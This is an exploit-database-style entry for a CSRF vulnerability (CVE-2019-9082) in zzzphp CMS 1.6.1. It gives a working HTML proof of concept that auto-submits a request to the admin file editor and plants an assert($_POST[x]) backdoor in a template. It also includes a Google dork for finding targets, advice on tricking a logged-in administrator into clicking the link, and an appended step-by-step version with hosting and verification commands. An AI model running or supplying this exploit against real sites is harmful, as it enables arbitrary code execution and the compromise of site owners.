# Exploit Title: Cross-Site Request Forgery(CSRF) of zzzphp cms 1.6.1
# Google Dork: intext:"2015-2019 zzcms.com"

# Date: 26/02/2019

# Exploit Author: Yang Chenglong

# Vendor Homepage: http://www.zzzcms.com/index.html

# Software Link: http://115.29.55.18/zzzphp.zip

# Version: 1.6.1

# Tested on: windows/Linux,iis/apache

# CVE : CVE-2019-9082

Due to the absence of CSRF token in the request, attackers can forge the post request and insert malicious codes into the template file which leads to dynamic code evaluation.

Exploit:


<html>



  <!-- CSRF PoC - generated by Burp Suite Professional -->



  <body>



  <script>history.pushState('', '', '/')</script>



    <form action="http://192.168.1.64/zzzphp/admin015/save.php?act=editfile" method="POST">



      <input type="hidden" name="file" value="&#47;zzzphp&#47;template&#47;pc&#47;cn2016&#47;html&#47;search&#46;html" />



      <input type="hidden" name="filetext" value="&#123;if&#58;assert&#40;&#36;&#95;POST&#91;x&#93;&#41;&#125;phpinfo&#40;&#41;&#59;&#123;end&#32;if&#125;" />



      <input type="submit" value="Submit request" />



    </form>



    <script>



      document.forms[0].submit();



    </script>



  </body>



</html>

Save the codes above as html file and host it on a web server. Send the link to the administrator of the website and ask him to click the link(request for exchange friend link or any other possible method), if the person has logged on to the admin panel, it will automatically insert malicious codes in to the template file and leads to dynamic code evaluation.

Remarks: This is a follow up exploit of CVE-2019-9041, whose exploit is here: https://www.exploit-db.com/exploits/46454



Instructions:


Create the Exploit HTML File:

Open a text editor and create a new file named csrf_exploit.html.

Copy and paste the following HTML code into csrf_exploit.html:
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.1.64/zzzphp/admin015/save.php?act=editfile" method="POST">
      <input type="hidden" name="file" value="/zzzphp/template/pc/cn2016/html/search.html" />
      <input type="hidden" name="filetext" value="{if:assert($_POST[x])}phpinfo();{end if}" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

Save the file.

Host the csrf_exploit.html file on a web server. You can use a simple HTTP server for this. For example, using Python:
python3 -m http.server 8000

This will serve the file at http://localhost:8000/csrf_exploit.html.


Open a browser and navigate to the hosted exploit file URL, e.g., http://localhost:8000/csrf_exploit.html.

Also, send this URL to an administrator of the zzzphp CMS site.

If the administrator is logged into the zzzphp CMS, the form will automatically submit and execute the CSRF attack, inserting the malicious code into the search.html file located at /zzzphp/template/pc/cn2016/html/search.html.


To verify the successful execution of the exploit, you can visit the URL where the search.html file is served, e.g., http://<target_site>/zzzphp/template/pc/cn2016/html/search.html.

 The page should execute the phpinfo() function, showing PHP configuration details.
